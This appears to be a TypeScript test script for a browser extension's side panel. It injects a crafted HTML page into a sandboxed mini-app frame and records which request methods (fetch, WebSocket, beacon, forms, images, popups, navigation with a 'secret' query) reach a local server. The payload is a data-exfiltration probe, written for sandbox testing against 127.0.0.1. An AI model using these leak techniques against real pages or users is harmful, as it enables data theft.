/**
 * 小实验（不是验收）：回答里的小程序放进 mini-app.html 后，能不能把数据带出去。
 *   npx tsx scripts/acceptance/real-path/mini-app-probe.mts --headless
 * 在真侧栏里嵌 mini-app.html，写进一段会用各种办法往本机服务器发请求的 HTML，看服务器收到了哪些。
 */
import { createServer } from "node:http";
import { launchRealPath, requireHeadless, siteAddress, sleep, until } from "./harness.mts";

requireHeadless();
const hits: string[] = [];
const server = createServer((req, res) => { hits.push(req.url ?? ""); res.writeHead(200, { "content-type": "text/html", "access-control-allow-origin": "*" }).end("<p>leaked</p>"); });
await new Promise<void>(r => server.listen(0, "127.0.0.1", r));
const o = `http://127.0.0.1:${siteAddress(server).port}`;
const attack = `<!doctype html><p id=s>start</p>
<link rel="stylesheet" href="${o}/css"><img src="${o}/img"><script src="${o}/script.js"></script>
<iframe src="${o}/iframe"></iframe><form action="${o}/form" method="get"><input name=x value=1></form>
<script>
const log = (t) => parent.postMessage({ probe: t }, "*");
fetch("${o}/fetch").then(() => log("fetch ok"), (e) => log("fetch blocked " + e));
try { new WebSocket("ws://127.0.0.1:${siteAddress(server).port}/ws"); log("ws created"); } catch (e) { log("ws blocked"); }
navigator.sendBeacon && log("beacon " + navigator.sendBeacon("${o}/beacon", "x"));
const i = new Image(); i.src = "${o}/img2";
try { const w = window.open("${o}/popup"); log("open " + !!w); } catch (e) { log("open blocked"); }
try { document.forms[0].submit(); log("form submitted"); } catch (e) { log("form blocked " + e); }
setTimeout(() => { try { location.href = "${o}/nav?d=secret"; log("nav set"); } catch (e) { log("nav blocked " + e); } }, 300);
setTimeout(() => { const a = document.createElement("a"); a.href = "${o}/toplink"; a.target = "_top"; document.body.append(a); a.click(); }, 500);
</script>`;
const rp = await launchRealPath();
try {
  const panel = await rp.attach(await rp.openSidePanel());
  await until(async () => await rp.evaluate(panel, "document.readyState === 'complete'") || undefined, 15_000, "panel");
  await rp.evaluate(panel, `(() => {
    window.__probe = [];
    addEventListener("message", (e) => { if (e.data?.probe) window.__probe.push(e.data.probe); if (e.data?.miniApp === "ready") e.source.postMessage({ html: ${JSON.stringify(attack)} }, "*"); });
    const f = document.createElement("iframe"); f.setAttribute("sandbox", "allow-scripts"); f.src = chrome.runtime.getURL("mini-app.html"); f.id = "probe"; document.body.append(f); return true; })()`);
  await sleep(4000);
  const logs = await rp.evaluate(panel, "window.__probe");
  const frameUrl = await rp.evaluate(panel, `(() => { try { return document.getElementById("probe").contentWindow.location.href; } catch (e) { return "cross-origin (" + e.name + ")"; } })()`);
  const targets = (await rp.targets()).filter(t => t.url.includes("127.0.0.1")).map(t => t.type + " " + t.url);
  console.log(JSON.stringify({ hits, logs, frameUrl, targets }, null, 1));
} finally { await rp.close(); await rp.remove(); server.close(); }
